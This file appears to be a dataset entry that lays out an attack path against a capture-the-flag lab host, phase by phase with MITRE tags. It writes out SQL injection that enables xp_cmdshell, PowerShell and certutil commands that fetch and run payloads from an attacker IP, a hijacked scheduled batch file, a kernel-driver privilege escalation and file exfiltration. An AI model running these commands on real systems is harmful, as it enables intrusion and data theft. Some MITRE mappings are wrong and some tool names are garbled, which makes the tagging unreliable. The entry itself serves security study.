@@ -1,0 +1,264 @@
+{
+  "id": "ap-0019",
+  "title": "SQL Injection Blind RCE -> Batch Persistence -> Kernel Driver PE",
+  "summary": "Exploiting blind SQL injection in a Microsoft IIS web application to achieve Remote Command Execution (RCE), pivoting access from the 'sqlserver' user to the 'decoder' user via a scheduled task, and performing Privilege Escalation using a vulnerable Capcom kernel driver.",
+  "attack_path_markdown": "### Step 1: Reconnaissance\nInitial scanning identified the target IP (10.10.10.72) running Microsoft IIS 8.5/ASP.NET. Subdomain fuzzing revealed `members.streetfighterclub.htb`, and subsequent content discovery located the vulnerable `/login.aspx` path.\n\n### Step 2: Initial Access (SQL Injection RCE)\nA Python script was created to automate chained blind SQL queries against MS SQL Server 2014 via `/login.aspx`. This script was used to enable advanced options, enable `xp_cmdshell`, create a temporary table (`rc`), inject commands, and retrieve results iteratively, leading to the execution of a PowerShell reverse shell as the `sqlserver` user.\n\n### Step 3: Persistence and Lateral Movement\nThe attacker discovered a writable batch file (`clean.bat`) in the `decoder` user's desktop directory, suspected to be executed by a scheduled task. The contents of `clean.bat` were overwritten with a PowerShell reverse shell payload. The task execution granted a pivot to the `decoder` user.\n\n### Step 4: Privilege Escalation (Kernel Driver)\nSystem enumeration identified the presence of the known vulnerable `capcom` kernel driver. A combined PowerShell exploit script was downloaded and executed, leveraging the driver vulnerability to elevate privileges to `NT AUTHORITY\\SYSTEM`.\n\n### Step 5: Post-Exploitation\nTwo key files, `root.exe` and `check.dll`, were exfiltrated using `certutil -encode`. Binary analysis of the DLL revealed a proprietary algorithm (XOR operation) required to obtain the final root password.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Scanning the target to identify open ports, operating system, web server details, and vulnerable subdomains/paths.",
+      "actions": [
+        "Verify target connectivity and OS type (Windows TTL 127): `ping 10.10.10.72` ",
+        "Scan all TCP ports quickly: `nmap -sT -p- --min-rate 5000 -vvv -n 10.10.10.72 -oG all_ports` ",
+        "Detailed port/version scan for port 80 (IIS 8.5 detected): `nmap -sC -sV -p80 -oN target 10.10.10.72`",
+        "Identify technologies: `whatweb 10.10.10.72` [6]",
+        "Add subdomain to hosts file: Modify `/etc/hosts` to map `streetfighterclub.htb` and `members.streetfighterclub.htb` to `10.10.10.72` ",
+        "Fuzz for subdomains (Discovers 'members'): `ffuf -c -H \"Host: FUZZ.streetfighterclub.htb\" -w /path/to/subdomains-top1mil-5000.txt -u http://10.10.10.72/ -hc 404 -t 200` ",
+        "Fuzz for web content (Discovers 'login.aspx'): `ffuf -c -w /path/to/directory-list-2.3-medium.txt -e .aspx -u http://members.streetfighterclub.htb/FUZZ.aspx -hc 404 -t 200` "
+      ],
+      "tools": [
+        "ping",
+        "Nmap",
+        "WhatWeb",
+        "ffuf"
+      ],
+      "techniques": [
+        "Network Scanning",
+        "Subdomain Enumeration",
+        "Content Discovery"
+      ],
+      "mitre_ids": [
+        "T1595.001",
+        "T1589"
+      ],
+      "indicators": [
+        "Subdomain `members.streetfighterclub.htb`",
+        "Path `/login.aspx`"
+      ],
+      "preconditions": "Network connectivity to the target host",
+      "expected_outcome": "Identification of the authentication panel via subdomain/path.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Crafting the SQL Injection chain for RCE and automating the process via Python scripting.",
+      "actions": [
+        "Test for SQLi vulnerability in POST parameters (e.g., using single quote `\'`)",
+        "Determine column count (6) using: `ORDER BY 100` (decreasing until no error)",
+        "Identify injectable column (5) using: `UNION SELECT 1, 2, 3, 4, 5, 6`",
+        "Identify SQL version: `UNION SELECT 1, 2, 3, 4, @@VERSION, 6` ",
+        "Develop Python script (`sql_automator.py`) to handle URL encoding, payload delivery, and output parsing (Base64 decoding) "
+      ],
+      "tools": [
+        "Burp Suite Repeater",
+        "Python (scripting)"
+      ],
+      "techniques": [
+        "SQL Command Injection (Blind/Chained)",
+        "Payload Automation"
+      ],
+      "mitre_ids": [
+        "T1190"
+      ],
+      "indicators": [
+        "HTTP 500 error on incorrect column count",
+        "Successful Base64 encoded output indicating injectability"
+      ],
+      "preconditions": "Vulnerable input field in POST data on `/login.aspx`",
+      "expected_outcome": "Automated capability to inject commands and retrieve output.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Executing the SQL queries to enable the RCE component (`xp_cmdshell`) and inject the command to fetch the reverse shell.",
+      "actions": [
+        "Enable advanced options: `; EXEC sp_configure 'show advanced options', 1;` ",
+        "Enable command shell component: `; EXEC sp_configure 'xp_cmdshell', 1;`",
+        "Create temporary output table: `; CREATE TABLE rc (id INT IDENTITY(1,1) PRIMARY KEY, output VARCHAR(1024));` ",
+        "Inject reverse shell execution command: `; INSERT INTO rc (output) EXEC Xp_CmdShell 'powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.32/ps.ps1\')';`  (Note: Attacker IP used in the transcript was `10.10.14.32`)"
+      ],
+      "tools": [
+        "Python script (`sql_automator.py`)",
+        "Netcat listener"
+      ],
+      "techniques": [
+        "SQL Command Injection",
+        "PowerShell Remote Execution"
+      ],
+      "mitre_ids": [
+        "T1059.003",
+        "T1059.001"
+      ],
+      "indicators": [
+        "TCP connection received on listener."
+      ],
+      "preconditions": "Successful enabling of advanced SQL server features.",
+      "expected_outcome": "Initial low-privilege shell access as 'sqlserver'.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Pivoting privilege from the 'sqlserver' user (initial access) to the 'decoder' user by abusing a scheduled execution mechanism.",
+      "actions": [
+        "Identify writable batch file: `dir C:\\Users\\decoder\\Desktop\\clean.bat` ",
+        "Set up HTTP server to host reverse shell payload (`ps.ps1`): `python3 -m http.server 80` ",
+        "Download payload to target: `certutil -urlcache -f http://10.10.14.32/ps.ps1 command`",
+        "Overwrite the contents of the batch file with the payload execution command (executed via `cmd /c`): `type C:\\Users\\sqlserver\\command >> clean.bat` ",
+        "Wait for scheduled task execution to gain new shell."
+      ],
+      "tools": [
+        "certutil",
+        "type (or similar command for writing to files)",
+        "Netcat/rlwrap listener: `rlwrap nc -lvnp 443` "
+      ],
+      "techniques": [
+        "Taint Shared Content",
+        "Scheduled Task Abuse (Implied T1053.005)"
+      ],
+      "mitre_ids": [
+        "T1547.001",
+        "T1053.005"
+      ],
+      "indicators": [
+        "Shell received as user `decoder`"
+      ],
+      "preconditions": "Write permissions on `clean.bat` and an executing scheduler process.",
+      "expected_outcome": "Pivoted shell access as user `decoder`",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Identifying the kernel driver vulnerability for Privilege Escalation.",
+      "actions": [
+        "Enumerate installed drivers: `driver query` ",
+        "Identify vulnerable driver: `capcom` (Capcom Kernel Rootkit) ",
+        "Consolidate multiple exploit functions into one PowerShell file (`capcom.ps1`)"
+      ],
+      "tools": [
+        "driver query",
+        "PowerShell",
+        "find"
+      ],
+      "techniques": [
+        "System Information Discovery",
+        "Vulnerable Driver Detection"
+      ],
+      "mitre_ids": [
+        "T1082",
+        "T1068"
+      ],
+      "indicators": [
+        "Driver listing shows 'capcom' entry."
+      ],
+      "preconditions": "Shell access as user `decoder` and identification of the driver.",
+      "expected_outcome": "Exploit script ready for execution.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Executing the compiled kernel exploit code via PowerShell.",
+      "actions": [
+        "Transfer and interpret exploit script: `powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.32/capcom.ps1')` ",
+        "Execute the core elevation function (implied): `Capcom-Elevate-PID`",
+        "Verify elevated privileges: `whoami`"
+      ],
+      "tools": [
+        "PowerShell IEX"
+      ],
+      "techniques": [
+        "Exploitation for Privilege Escalation",
+        "Code Injection"
+      ],
+      "mitre_ids": [
+        "T1068"
+      ],
+      "indicators": [
+        "Shell environment showing `NT AUTHORITY\\SYSTEM`"
+      ],
+      "preconditions": "Successfully interpreted `capcom.ps1` script and existence of the vulnerable driver.",
+      "expected_outcome": "Highest privilege level achieved (SYSTEM).",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Retrieving and analyzing required files to obtain the final objective.",
+      "actions": [
+        "Exfiltrate `root.exe`: `certutil -encode root.exe root.exe.b64` ",
+        "Exfiltrate `check.dll`: `certutil -encode check.dll check.dll.b64` ",
+        "Transfer and decode files on attacker machine: `cat root.exe.b64 | base64 -d > root.exe` [38] (Conceptual)",
+        "Analyze binary files (root.exe/check.dll): `r2 -A root.exe`, `afl` (list functions), `pdf` (disassemble function) ",
+        "Determine decryption mechanism (XOR key 9, 10 iterations) ",
+        "Bruteforce/decrypt proprietary algorithm to find final password."
+      ],
+      "tools": [
+        "certutil",
+        "Radare2 (`r2`)",
+        "CyberChef (used for XOR bruteforce in source, conceptual analysis tool)"
+      ],
+      "techniques": [
+        "Binary Analysis",
+        "Data Exfiltration (Encoding)",
+        "Cryptographic Decryption"
+      ],
+      "mitre_ids": [
+        "T1020",
+        "T1552.001"
+      ],
+      "indicators": [
+        "Final password retrieved: 'odio la zeta'"
+      ],
+      "preconditions": "SYSTEM privileges to access Administrator Desktop and successful file analysis.",
+      "expected_outcome": "Objective accomplished.",
+      "confidence": 1.0
+    }
+  ],
+  "tactics": [
+    "Initial Access",
+    "Execution",
+    "Persistence",
+    "Privilege Escalation",
+    "Discovery",
+    "Exfiltration"
+  ],
+  "techniques": [
+    "SQL Injection (T1059.003)",
+    "Remote Command Execution (T1059.001)",
+    "Scheduled Task Abuse (T1053.005)",
+    "Vulnerable Driver Exploitation (T1068)",
+    "Binary Analysis (T1552.001)"
+  ],
+  "mitre_ids": [
+    "T1059.003",
+    "T1068",
+    "T1547.001",
+    "T1573.001",
+    "T1082"
+  ],
+  "hosts": [
+    "10.10.10.72",
+    "streetfighterclub.htb",
+    "members.streetfighterclub.htb"
+  ],
+  "privs_obtained": [
+    "sqlserver",
+    "domain user (decoder)",
+    "administrator (NT AUTHORITY\\SYSTEM)"
+  ],
+  "confidence": 0.95,
+  "source_file": "",
+  "notes": "The SQL injection steps rely on a custom Python script that iterates through the output table (`rc`) and URL-encodes the complex queries for successful delivery.",
+  "labels": [
+    "sql_injection",
+    "rce",
+    "privilege_escalation",
+    "kernel_exploit",
+    "ms_sql_server"
+  ]
+}
